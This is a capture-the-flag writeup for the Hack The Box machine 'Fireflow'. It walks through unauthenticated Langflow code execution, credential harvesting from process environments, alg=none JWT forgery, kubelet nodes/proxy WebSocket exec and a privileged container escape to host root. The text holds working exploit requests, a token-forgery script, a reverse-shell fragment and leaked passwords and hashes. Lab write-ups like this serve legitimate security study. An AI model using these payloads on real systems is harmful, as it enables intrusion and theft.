# Fireflow — HTB Writeup

**Target:** fireflow.htb / flow.fireflow.htb (10.129.87.21)
**OS:** Ubuntu 24.04 (Linux)
**Difficulty:** Medium
**Stack:** Langflow 1.8.2 (Python/FastAPI low-code AI-flow builder), nginx (TLS
reverse proxy, wildcard vhost routing), systemd, a single-node k3s cluster
running natively on the host alongside Langflow, an internal "MCP AI Tool
Registry" microservice, a Prometheus `node-exporter` DaemonSet

---

## Skills Required

- **Langflow / low-code AI flow-builder architecture** — how a flow's nodes
  carry both a `metadata.module` import path and an editable `template.code`
  field, and how the build backend resolves one or the other at execution
  time.
  [Langflow custom components docs](https://docs.langflow.org/components-custom-components),
  [GHSA-g2j9-7rj2-gm6c (Langflow arbitrary file write advisory, same app/CVE family)](https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c)
- **JWT structure and signature-verification bypasses**, specifically the
  `alg: none` unsecured-JWT case.
  [PortSwigger Web Security Academy — JWT attacks](https://portswigger.net/web-security/jwt),
  [PortSwigger — "JWT none algorithm supported"](https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported)
- **Linux process environment disclosure** — reading a running service's
  environment variables (and any secrets in them) via `/proc/<pid>/environ`.
  [`proc(5)` man page](https://man7.org/linux/man-pages/man5/proc.5.html)
- **Kubernetes RBAC and ServiceAccounts** — how a mounted SA token scopes a
  pod's API-server permissions, and how to enumerate a token's actual grants
  with `SelfSubjectRulesReview` instead of guessing from the Role's name.
  [Kubernetes docs — Using RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/),
  [Kubernetes docs — Service Accounts](https://kubernetes.io/docs/concepts/security/service-accounts/)
- **The kubelet HTTPS API and Node authorization mode** — why `nodes/proxy`
  is the resource that gates *any* direct call to a kubelet, and how the
  Node authorizer derives an RBAC verb from the HTTP method of the request.
  [Kubernetes docs — Node Authorization](https://kubernetes.io/docs/reference/access-authn-authz/node/),
  [Graham Helton — "Kubernetes Remote Code Execution Via Nodes/Proxy GET Permission"](https://grahamhelton.com/blog/nodes-proxy-rce)
- **The WebSocket protocol handshake** — enough of RFC 6455 to hand-roll a
  minimal client (`Sec-WebSocket-Key`/`-Accept`, frame opcodes, masking) when
  no off-the-shelf tool is available inside a restricted execution
  environment.
  [RFC 6455 — The WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455.html)
- **Privileged-container / `hostPID` host escape mechanics** — why
  `/proc/1/root` inside a `privileged: true`, `hostPID: true` container
  resolves to the real host filesystem regardless of an explicit bind
  mount's `readOnly` flag.
  [HackTricks — Docker Breakout / Privilege Escalation](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html)

---

## Recon

`nmap` against the bare IP showed almost nothing: SSH (22) and HTTPS (443,
nginx, self-signed cert) — everything else closed or filtered. The
certificate itself was the first real lead: CN `fireflow.htb`, SAN
`fireflow.htb` + `*.fireflow.htb`, org "Task Force Nightfall" — a wildcard
SAN on a single-service box is a direct hint that nginx is doing Host-header
vhost routing to more than one backend, so vhost enumeration is the natural
next step before treating 443 as one flat surface.

```
$ nmap -Pn -T4 -p 21,22,25,53,80,443,445,8080 10.129.87.21
PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
443/tcp  open   https
445/tcp  closed microsoft-ds
8080/tcp closed http-proxy
```

A SecLists-scale Host-header fuzz against the wildcard cert found exactly
one live subdomain beyond the bare domain: `flow.fireflow.htb`. The bare
domain (`fireflow.htb`) turned out to be a static "in-universe" landing page
for a fictional intelligence-automation platform ("Task Force Nightfall"),
and its content itself leaked the real attack surface directly — the page
links to a **public playground flow** at
`https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25`
and names the backend engine and version explicitly ("Flow engine version:
1.8.2"). That single UUID is what the rest of the box hinges on.

`flow.fireflow.htb` turned out to be a full **Langflow 1.8.2** deployment
with its OpenAPI spec openly reachable, unauthenticated — `/openapi.json`
and `/docs` both returned full content with no auth challenge at all, which
is unusual for a production instance and meant the entire ~80-endpoint API
surface (including auth requirements per-endpoint) was enumerable for free
before ever touching an exploit:

```
$ curl -sk "https://10.129.87.21/api/v1/version" -H "Host: flow.fireflow.htb"
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

Two endpoints from that spec mattered immediately: `GET
/api/v1/flows/public_flow/{flow_id}` (no-auth flow-definition read, if the
flow is marked public) and `POST /api/v1/build_public_tmp/{flow_id}/flow`,
whose own docstring in the spec states it exists specifically to "build a
public flow without requiring authentication" and "uses the flow owner's
permissions to build the flow" — i.e. it's designed to accept caller-
supplied flow data and run it with no session at all. Combined with the
leaked playground UUID, that made "hijack the public flow's own definition
and resubmit it" the obvious first vector to chase, well before any CVE
research.

Putting this together going into Foothold: an endpoint explicitly designed
to run caller-supplied Python unauthenticated, reachable via a leaked UUID,
made the public-flow hijack the obvious first move to try before any CVE
research. The landing page had also flagged an "MCP Tool Registry" as
online, and the OpenAPI spec separately listed Langflow's own
`/api/v1/mcp/*` endpoints as a murkier, harder-to-characterize secondary
surface — my working theory was that this would be a two-stage box: an
initial web foothold via the flow hijack, then some MCP-related surface for
privesc once a shell existed to actually reach it. That overall shape held,
though not the way it looked from recon alone: the MCP surface that ended
up mattering was a completely separate internal registry service, reached
much later through a leaked credential file rather than through Langflow's
own documented MCP API at all.

## Foothold

### CVE triage before building a custom exploit

Before assuming this needed a from-scratch bug, I checked whether an
already-published Langflow 1.8.2 CVE would get there faster:

- **CVE-2025-3248** (unauthenticated `exec()` via `/api/v1/validate/code`,
  CVSS 9.8) — confirmed not applicable outright: that endpoint doesn't
  exist anywhere in this version's `/openapi.json` (removed, not just
  auth-gated).
- **CVE-2026-5027** (`POST /api/v2/files` filename path traversal →
  arbitrary file write → RCE via cron injection, CVSS 8.8, fixed in 1.9.0)
  — version-matches (target is 1.8.2, well inside the ≤1.8.4 affected
  range). Pulled the actual vulnerable source at the deployed tag to
  confirm the bug is really present rather than trusting the advisory
  summary:

  ```python
  # src/backend/base/langflow/services/storage/local.py @ v1.8.2
  folder_path = self.data_dir / flow_id
  await folder_path.mkdir(parents=True, exist_ok=True)
  file_path = folder_path / file_name   # file_name can contain ../../, no resolve()/is_relative_to() check
  ```

  `upload_user_file()` in `api/v2/files.py` derives the filename straight
  from the client-supplied `Content-Disposition` filename and passes it
  through unmodified — the traversal is real. But the endpoint requires
  `current_user: CurrentActiveUser`, and the CVE's public write-ups
  describe the pre-auth path relying on `LANGFLOW_AUTO_LOGIN=true`
  (Langflow's documented default, which silently hands out a valid session
  token via `GET /api/v1/auto_login` with zero credentials). Tested that
  specifically against this target:

  ```
  $ curl -sk "https://10.129.87.21/api/v1/auto_login" -H "Host: flow.fireflow.htb"
  {"detail":{"message":"Auto login is disabled.","auto_login":false}}
  ```

  Auto-login is explicitly turned off here, and self-registration
  (`POST /api/v1/users/`) creates accounts as `is_active: false` pending
  approval — no unauthenticated path to a session for this primitive was
  found. CVE-2026-5027 is real and present but **not weaponizable pre-auth
  on this target**; it stayed a fallback path for later (see below) rather
  than the way in.

### The actual vector: hijacking the public flow's component resolution

With the documented CVE ruled out pre-auth, I went back to the endpoint the
recon phase had already flagged. Fetching the flow definition confirmed it
really is public and really does hand back full node source:

```bash
curl -sk "https://10.129.87.21/api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25" \
  -H "Host: flow.fireflow.htb" -o /tmp/flow.json
```

Every node in that JSON carries two things side by side: `data.type` (a
component name, e.g. `"ChatOutput"`) and
`data.node.metadata.module` (an import path, e.g.
`"lfx.components.input_output.chat_output.ChatOutput"`), alongside the
component's full editable Python source in
`data.node.template.code.value`. That's the same layout the Langflow UI
uses to let a user tweak a component's code in the browser — which raises
the obvious question of which of the two the *backend* actually trusts when
building the flow.

I tested this directly rather than assuming: submitting a modified `code`
value while leaving the original `metadata.module` untouched had **no
effect at runtime** — a deliberately broken `raise RuntimeError(...)` and a
method monkeypatch both silently did nothing, while injecting invalid
Python syntax into the same field immediately produced `{"text": "Invalid
Python code: invalid syntax (<unknown>, line 1)\n"}`. That pairing proves
two things at once: the server *does* compile whatever text sits in `code`
(the syntax error proves that), but for a node that still has a resolvable
`module` path, the compiled result isn't what actually gets instantiated
and run — the backend imports the real class via `module` and ignores the
client's source text entirely for execution purposes.

That meant the resolution priority had to be: "if `module` is present and
importable, use it; otherwise fall back to compiling `code` directly." So
stripping `metadata` entirely should force the fallback path — a live
target-side confirmation of that hypothesis (rather than something read off
a CVE writeup), then verified by hijacking `ChatOutput`'s
`message_response()` method to shell out and return the result as the chat
response text:

```python
for n in nodes:
    if n["data"].get("type") == "ChatOutput":
        n["data"]["node"]["template"]["code"]["value"] = malicious_code  # full replacement ChatOutput class
        n["data"]["node"]["metadata"] = {}                                # strip module -> forces exec of our code
```

```bash
curl -sk -X POST "https://10.129.87.21/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Host: flow.fireflow.htb" -H "Content-Type: application/json" \
  -b "client_id=$(python3 -c 'import uuid;print(uuid.uuid4())')" \
  -d @/tmp/hijack_chatoutput.json -w '\nHTTP_CODE:%{http_code}\n'
```
```
{"job_id":"<uuid>"}
HTTP_CODE:200
```

```bash
curl -sk "https://10.129.87.21/api/v1/build_public_tmp/<job_id>/events" \
  -H "Host: flow.fireflow.htb" -b "client_id=<same-uuid-as-above>" --max-time 15
```
The build's `end_vertex` event for the `ChatOutput-*` node came back with
`data.results.message.data.text` set to the hijacked command's own
stdout/stderr — arbitrary command execution round-tripped through the chat
response, unauthenticated:

```
$ python3 "Tooling and Scripts/exploits/Fireflow/langflow_public_flow_code_hijack_rce.py" "id; hostname; whoami"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fireflow
www-data
```

This confirmed the working theory from Recon: the public-flow build
endpoint, not the documented CVE, was the box's actual intended way in.

This is architecturally the same underlying flaw class as CVE-2025-3248
(client-supplied Python compiled/exec'd with no sandbox), reached through a
completely different, evidently out-of-scope-for-that-fix endpoint —
`build_public_tmp`'s entire purpose is to accept unauthenticated,
caller-supplied flow data for a legitimately-public flow, and the missing
check is that node component resolution never re-derives `metadata.module`
server-side from `data.type`; it trusts whatever (or nothing) the client
sent. This isn't a clean match for any single public CVE — see
[[langflow-flow-metadata-module-strip-rce]] for the generalized pattern.

The reusable oracle script (re-fetches the current flow definition every
call, so it survives the flow being reset/edited):
`Tooling and Scripts/exploits/Fireflow/langflow_public_flow_code_hijack_rce.py`.

A full interactive reverse shell using the same primitive (`Popen`-launched
`bash -i >& /dev/tcp/...`) also landed successfully, twice, but proved
unstable to keep alive over the FIFO-driven channel used to interact with
it (see [[reverse-shell-fifo-interaction]] for the mechanism and its known
failure modes). The blind command-execution oracle above was stateless and
repeatable, so it did all further enumeration instead.

### Credential harvest and pivot to SSH

Langflow runs as a systemd service, so its process environment is readable
from the `www-data` foothold via `/proc/<pid>/environ` for the service's
own PID:

```
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

The superuser credential worked immediately against the app's own login:

```bash
curl -sk -X POST "https://10.129.87.21/api/v1/login" -H "Host: flow.fireflow.htb" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=langflow&password=n1ghtm4r3_b4_n1ghtf4ll' -w '\nHTTP_CODE:%{http_code}\n'
```
`HTTP_CODE:200`, a valid access/refresh JWT pair. This is the same
credential pattern I'd expect a deployment secret to follow (a themed,
memorable string tied to the box's own "Nightfall" naming, not a wordlist
word) — worth a single reasoned try against the only real OS account on the
box (`nightfall`, uid 1000, per `/etc/passwd`) rather than a spray:

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh -o StrictHostKeyChecking=no nightfall@10.129.87.21 'id; hostname; whoami'
```
```
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
fireflow
nightfall
```

**user.txt:** `a7d1ace72f2e9d020ad1e02691b6998d`

`sudo -l` as `nightfall` requires a password that isn't this one — left as
an open lead for privesc rather than blind-guessed further. One more thing
sat in `nightfall`'s own home directory worth flagging immediately:
`/home/nightfall/.mcp/config.json` (mode 600) held a second credential set
for an internal service on port 30080 (`langflow-bot` /
`Langfl0w@mcp2026!`), which the original external nmap scan never showed
open — a strong signal it's bound to loopback/internal-only. This is the
same "MCP Tool Registry" the landing page had named as online back in
Recon — the working theory that an MCP-related surface would matter for the
next stage held up, though the actual mechanism (a leaked credential file
on a completely unrelated OS account, not Langflow's own `/api/v1/mcp/*`
API) wasn't something recon could have predicted in detail.

## Privesc

### Standard local enumeration — dead ends, documented for completeness

None of the usual local checks produced anything: `sudo -n -l` requires a
password with no `NOPASSWD` entries; SUID/SGID/capability sweeps turned up
only stock Ubuntu 24.04 binaries; cron/timers were all stock except one
root-only oneshot (`/opt/lab/firewall.sh`, mode 700, unreadable — almost
certainly the source of the iptables rule blocking 30080 externally, which
at least explained *why* that port was internal-only); `apt
list --upgradable` was empty (no version-lag privesc surface); and
`nightfall` isn't a member of `docker` or any other privileged group
(`/etc/group` shows `docker:x:111:` with zero members). The real path ran
entirely through the MCP lead already found in `nightfall`'s own home
directory during Foothold.

### Reaching and breaking the internal MCP service

```bash
curl -s -m 5 http://127.0.0.1:30080/api/v1/version
```
```json
{"service":"MCP AI Tool Registry","version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp                        [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools               [admin]"]}
```

The service's own version banner self-reports `"none"` as a supported
signing algorithm. That's a direct tell, not an inference — a JWT verifier
that lists `none` alongside `HS256` as something it will *accept* means the
unsigned-token bypass documented broadly for JWT implementations (PortSwigger's
["JWT none algorithm supported"](https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported))
applies here by the service's own admission, before ever touching a token.
Once RCE was achieved (below) I pulled the actual source and confirmed the
mechanism exactly matches:

```python
def verify_token(credentials=Depends(security)):
    token = credentials.credentials
    header = jose_jwt.get_unverified_header(token)
    alg = header.get("alg", "HS256")
    if alg == "none":
        payload = jose_jwt.decode(token, key="", options={"verify_signature": False})
    elif alg == "HS256":
        payload = jose_jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

Forged an admin token with no signature at all:

```bash
python3 -c "
import base64, json
def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
header = {'alg':'none','typ':'JWT'}
payload = {'sub':'admin','role':'admin'}
print(b64url(header) + '.' + b64url(payload) + '.')
"
```
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

Confirmed it satisfies the `require_admin` check (`payload.get("role") !=
"admin"`) on the only admin-gated route:

```bash
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
curl -s -m 5 -X POST http://127.0.0.1:30080/api/v1/tools \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"whoami-test","description":"test","code":"def run():\n    import subprocess\n    return subprocess.getoutput(\"id\")\n"}'
```
```json
{"status":"registered","name":"whoami-test"}
```
200, admin-gated action accepted with no valid signature whatsoever. This
alg=none pattern is generalized in
[[jwt-algorithm-confusion-and-header-injection]].

### Finding the real calling convention, then landing RCE

`POST /api/v1/tools` stores arbitrary code under a name; `POST /mcp`
(`tools/call`) invokes it. Guessing a calling convention (`handler(args)`,
`execute(arguments)`, a top-level `result =` variable, a function matching
the tool's own name) all silently returned empty text — none were how the
code was actually run. Rather than keep guessing, I used the primitive
itself to read the service's own source once basic code execution was
confirmed via a different signal (see below), which explained why every
guess had failed: the handler doesn't call any function inside the
submitted code at all, it just runs the whole thing as a script:

```python
stdin_data = json.dumps(arguments).encode()
proc = subprocess.Popen(["python3", "-c", tool["code"]], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
```

So the working convention is a plain top-level `print()`:

```json
{"jsonrpc":"2.0","id":9,"result":{"content":[{"type":"text","text":"uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)\n"}],"isError":false}}
```

```bash
python3 mcp_pyexec.py <(python3 - <<'EOF'
print(open("/app/main.py").read())
EOF
)
```
Reading `/app/main.py` back confirmed the `alg=none` mechanism above and
also surfaced a second, HS256-signed credential pair hardcoded in the
service's own `USERS` dict (`nightfall-admin` /
`4dm1n@NightfallOps!`) — a legitimate equivalent of the forged token, not
needed since the forgery already worked, and confirmed *not* to reuse
anywhere else on the host (tried once against `nightfall`'s sudo password,
checked against Langflow's user list — both negative).

This RCE (`mcp_pyexec.py` / `mcp_shell_exec.py` in the vault, the latter
base64-wrapping shell commands for quoting safety) lands as uid 1000
(`mcp`), but `hostname` immediately showed it's a different box entirely:

```
$ hostname
mcp-server-54464cb475-29ztf
```

### Discovering the k3s cluster and its RBAC boundary

That hostname pattern (`<deployment>-<hash>-<suffix>`) is Kubernetes's own
Pod-naming convention, so the next checks were the standard "am I in a
pod" ones:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace   # -> default
env | grep -i kube   # KUBERNETES_SERVICE_HOST=10.43.0.1
```

Confirmed a mounted ServiceAccount token for
`system:serviceaccount:default:mcp-sa`. Cross-checked against the host's
own process list (already visible from the `nightfall` shell before ever
reaching this pod):

```bash
ps auxf | grep -iE "kube|containerd|k3s"
```
showed `/usr/local/bin/k3s server`, `dockerd`, `containerd`, and multiple
`containerd-shim-runc-v2` processes — confirming this is a **single-node
k3s cluster running natively on the host**, with Langflow itself running
outside it directly on the OS.

Rather than guess what `mcp-sa` could do from behavior alone, I queried it
directly with `SelfSubjectRulesReview` — the canonical Kubernetes API for a
principal to ask "what am I actually authorized to do":

```bash
POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews
  {"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}
```
```json
{"status":{"resourceRules":[
  {"verbs":["get"],"apiGroups":[""],"resources":["nodes/proxy"]},
  {"verbs":["create"],"apiGroups":["authorization.k8s.io"],"resources":["selfsubjectaccessreviews","selfsubjectrulesreviews"]},
  {"verbs":["create"],"apiGroups":["authentication.k8s.io"],"resources":["selfsubjectreviews"]}
]}}
```

Cross-checked empirically as well — every other resource tested (pods,
secrets, namespaces, nodes, clusterrolebindings, by both list and named
get) returned a flat `403`. Both the declarative review and the live probes
agree: this token is authorized for exactly one thing, `get` on
`nodes/proxy`, cluster-wide. `nodes/proxy` looks like an innocuous,
narrowly-scoped grant — it's the resource that gates a kubelet proxy call,
not the pods/secrets an attacker would normally chase — but it turns out to
be a much bigger door than its name suggests.

### `get nodes/proxy` → full pod-spec disclosure via the kubelet

Kubelet's own HTTPS API (10250, confirmed listening on `0.0.0.0:10250`
from the earlier host-level `ss -ntlp`) accepts the SA token directly, and
`GET /pods` on it maps internally to exactly the authorized resource
(`resource=nodes`, `subresource=proxy`, `verb=get`) — no separate `pods`
RBAC grant is consulted at all, since the whole request is proxied through
the node object:

```bash
TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -m5 -H "Authorization: Bearer $TOK" https://10.129.87.21:10250/pods
```
returned the full `PodList` for the node — every pod's spec, volumes, env,
and security context. (Confirmed this isn't a kubelet-anonymous-auth
misconfig separately: the same call with no token returned a proper `401`.)

Parsing that dump surfaced a whole monitoring stack
(`kube-state-metrics`, `prometheus-server`, `prometheus-node-exporter`)
that had never shown up anywhere in prior enumeration, and one pod whose
spec is a textbook `prometheus-node-exporter` Helm-chart-default
misconfiguration:

```json
{
  "metadata": {"namespace": "monitoring", "name": "prometheus-prometheus-node-exporter-nmntq"},
  "spec": {
    "hostNetwork": true, "hostPID": true,
    "volumes": [
      {"name": "root", "hostPath": {"path": "/"}}
    ],
    "containers": [{
      "name": "node-exporter",
      "securityContext": {"privileged": true, "runAsUser": 0, "runAsNonRoot": false, "allowPrivilegeEscalation": true},
      "volumeMounts": [
        {"name": "root", "mountPath": "/host/root", "readOnly": true, "mountPropagation": "HostToContainer"}
      ]
    }]
  }
}
```
`privileged: true` + `runAsUser: 0` + `hostPID: true` + a host-`/` bind
mount is equivalent to host root the moment anything can be executed inside
that specific container.

### `create nodes/proxy` is blocked — bypassing it via the WebSocket exec transport

The obvious next move, a `kubectl exec`-equivalent call, is correctly
denied — confirming the RBAC boundary is doing exactly what it says:

```bash
curl -sk -m10 -X POST "https://10.129.87.21:10250/run/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?cmd=id" \
  -H "Authorization: Bearer $TOK"
```
```
Forbidden (user=system:serviceaccount:default:mcp-sa, verb=create, resource=nodes, subresource(s)=[proxy])
```

Kubelet's Node authorizer infers the RBAC verb purely from the request's
HTTP **method** (GET → `get`, POST → `create`), not from what the endpoint
actually does. The legacy `/run/` endpoint and the SPDY-based `/exec/`
upgrade that `kubectl exec` uses under the hood both start with a POST, so
both correctly need `create`, which `mcp-sa` doesn't have. But kubelet's
`remotecommand` handler *also* supports exec over **WebSocket**
(sub-protocol `v4.channel.k8s.io`), and a WebSocket upgrade handshake is,
per RFC 6455, always initiated as an HTTP **GET**. Tested that directly:

```bash
curl -sk -m10 -X GET "https://10.129.87.21:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?command=id&input=1&output=1&tty=1" \
  -H "Authorization: Bearer $TOK" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="
```
```
Upgrade request required   (HTTP 500)
```
Crucially, no `Forbidden` this time — the request passed authorization (the
Node authorizer computed `verb=get` for this GET-method call to the same
`/exec/` path, and `get nodes/proxy` covers it) and failed only because
`curl` can't complete a real WebSocket handshake on its own. This is the
actual gap: the authorizer's verb-from-HTTP-method mapping has no concept
of "this specific GET is the handshake for a fully interactive exec
session," it's just another GET to `nodes/proxy`. (This exact bypass class
is separately documented — see
[Graham Helton's "Kubernetes Remote Code Execution Via Nodes/Proxy GET
Permission"](https://grahamhelton.com/blog/nodes-proxy-rce) — though it was
arrived at here through direct testing against this target's own responses,
not by consulting that write-up first.)

No off-the-shelf WebSocket client (`websocat`, a browser, a full Python
`websockets` install) was available inside the constrained `mcp-server`
pod's own execution environment (arbitrary `python3 -c` only, whatever
stdlib ships in the image), so I wrote a minimal stdlib-only client
implementing just enough of RFC 6455 to complete the handshake and decode
the resulting frames — `kubelet_ws_exec.py`, saved to the vault. Its core
mechanism: send the raw HTTP GET-with-Upgrade-headers request manually over
a TLS socket, read past the `101 Switching Protocols` response, then parse
the unmasked server→client WebSocket frames that follow and demultiplex
them by their first payload byte (channel `0`=stdin, `1`=stdout,
`2`=stderr, `3`=the exec status/error channel — the same channel
convention the SPDY transport uses):

```python
req = (f"GET {path} HTTP/1.1\r\nHost: {NODE}:{PORT}\r\n"
       f"Authorization: Bearer {tok}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n"
       f"Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: {key}\r\n"
       f"Sec-WebSocket-Protocol: v4.channel.k8s.io\r\n\r\n")
# ... then read/parse standard WS frames, demux by first payload byte
```

Deployed as MCP "tool" code (so it runs with `mcp-sa`'s own token mounted
inside the pod, via `mcp_pyexec.py`):

```bash
python3 mcp_pyexec.py <(python3 -c "
content = open('kubelet_ws_exec.py').read()
content = content[:content.index('if __name__')]
content += 'print(ws_exec(\"monitoring\", \"prometheus-prometheus-node-exporter-nmntq\", \"node-exporter\", [\"id\"]))'
print(content)
")
```
```json
{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)\n\n[error-channel]\n{\"metadata\":{},\"status\":\"Success\"}\n\n"}],"isError":false}}
```

`uid=0` inside the privileged `node-exporter` container.

## Root

`hostPID: true` means this container shares the host's PID namespace, so
`/proc/1` inside it *is* the host's real PID 1 — and because the container
is `privileged: true`, all capability/DAC restrictions are bypassed for
reads through `/proc/1/root`, regardless of the `readOnly: true` flag on
the *separate*, explicit `/host/root` bind mount (that flag only restricts
writes through the intentional mount point, it has no bearing on the
unrestricted, namespace-crossing view `/proc/1/root` provides).

```bash
python3 mcp_pyexec.py <(python3 -c "
content = open('kubelet_ws_exec.py').read()
content = content[:content.index('if __name__')]
content += 'print(ws_exec(\"monitoring\", \"prometheus-prometheus-node-exporter-nmntq\", \"node-exporter\", [\"sh\", \"-c\", \"ls -la /proc/1/root/root/ 2>&1; echo ---; cat /proc/1/root/root/root.txt 2>&1\"]))'
print(content)
")
```
```
total 48
drwx------    7 root     root          4096 Aug 13 19:10 .
...
-rw-r-----    1 root     root            33 Aug 13 19:10 root.txt
-rwxr-xr-x    1 root     root           882 May 11 11:16 update_mcp_ip.sh
---
b4c709659dc96dc0e3be3e6ac840610b
```

**root.txt:** `b4c709659dc96dc0e3be3e6ac840610b`

Confirmed this is genuinely the host's own filesystem, not a container-local
lookalike, with a second, independent check (`/etc/shadow`, not just
`root.txt`):

```
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
fireflow
root:$y$j9T$Er8olKKwyOpFwsSYkY9jx1$x9dHTdrLy71qY3n4IlGB.nTXmjl4ttYyfNgIqAYi218:20580:0:99999:7:::
daemon:*:20135:0:99999:7:::
bin:*:20135:0:99999:7:::
```
`hostname` from inside the same `sh -c` call returned `fireflow` (the real
box hostname, not the pod's), which is what actually proves the escape —
a container could otherwise be made to fake a `root.txt`-shaped file at the
expected path.

**Full escalation chain, in one line each:**
1. `www-data` (Langflow public-flow component hijack) → env-leaked
   Langflow superuser password → reused as `nightfall`'s real SSH
   password.
2. `nightfall` → internal MCP registry (port 30080, creds leaked in
   `~/.mcp/config.json`) → `alg=none` JWT forgery → admin-gated
   `POST /api/v1/tools` RCE as `mcp`, inside the `mcp-server` pod.
3. `mcp-sa`'s ServiceAccount token, scoped to `get nodes/proxy` only →
   direct kubelet `GET /pods` → full pod-spec disclosure → found the
   `privileged`+`hostPID`+host-root-mounted `node-exporter` DaemonSet pod.
4. `create nodes/proxy` (needed for SPDY-based `kubectl exec`) is denied,
   but the WebSocket exec transport upgrades via GET, which the Node
   authorizer's HTTP-method verb inference conflates with the already-
   granted `get` — exec'd as `uid=0` inside the privileged pod.
5. `hostPID` + `privileged` → `/proc/1/root` is the real host filesystem,
   unrestricted → read `root.txt`/`/etc/shadow` directly.

**Root cause, in one line:** an RBAC role meant to permit only "read node
metadata via the kubelet proxy" (`get nodes/proxy`) actually authorizes
*any* GET-framed kubelet request, including the WebSocket exec handshake,
and the cluster separately runs a `node-exporter` DaemonSet with the
well-known but easy-to-overlook `privileged + hostPID + host-root-mount`
Helm chart default — together they turn one narrow, read-only-looking grant
into full host root.

## Rabbit Holes

- **CVE-2026-5027 as the intended pre-auth vector.** The version match was
  exact (1.8.2, well inside the affected range) and the vulnerable code was
  confirmed present at the source level, so this looked like the box's
  "real" foothold at first glance — public write-ups even describe it as
  actively exploited in the wild. It was closed out properly, not just
  assumed dead: the documented pre-auth bypass (`LANGFLOW_AUTO_LOGIN=true`
  handing out a free session token) was tested directly and came back
  `{"auto_login":false}`, and self-registration was separately confirmed to
  land in an inactive, unapproved state with no way to activate it
  pre-auth. It remained a legitimate fallback path once the *langflow*
  superuser JWT was recovered later in the chain (a fully authenticated
  route to the same CVE was available at that point) but was never actually
  needed once the `build_public_tmp` hijack worked directly.
- **`alice`/`nightfall-admin`-style secondary credentials as reuse
  targets.** The MCP service's own source (`/app/main.py`) turned up a
  second, legitimately HS256-signed credential pair
  (`nightfall-admin`/`4dm1n@NightfallOps!`) sitting right next to the one
  that mattered. It read as exactly the shape of credential that tends to
  reuse elsewhere on these boxes (an admin-flavored username, a
  box-themed password). Checked concretely, not just assumed dead: tried
  once against `nightfall`'s own sudo password (`sudo -S -l`, rejected),
  and checked Langflow's user list and its stored global
  variables/API-keys via the `langflow` superuser session for any matching
  account or reference — nothing. Closed as a genuine dead end, not a
  near-miss; it just never needed testing beyond those two concrete checks
  since the `alg=none` forgery already worked without any valid credential
  at all.
- **Guessing the MCP tool's calling convention.** Before recovering
  `/app/main.py`, several plausible invocation shapes were tried against
  `POST /mcp` (`handler(args)`, `execute(arguments)`, `run(arguments)`,
  `main(arguments)`, a bare `result =` variable, a function named after the
  tool itself) and all silently returned empty text with no error to
  distinguish "wrong convention" from "code didn't run at all." This could
  have read as a dead end on the whole RCE primitive; the actual resolution
  was to stop guessing and read the service's own source once *any* form of
  execution was confirmed (via a different, blind side-channel signal), at
  which point the real mechanism (`subprocess.Popen(["python3","-c",code])`,
  stdout captured raw — no function call happens at all) made the empty
  results self-explanatory.

## Skills Learned

- Unauthenticated Python RCE via Langflow's `build_public_tmp` endpoint by
  stripping a node's `metadata.module` reference to force fallback
  compile-and-exec of client-supplied component source
- CVE-2026-5027 (Langflow path-traversal file-write RCE) source-level patch
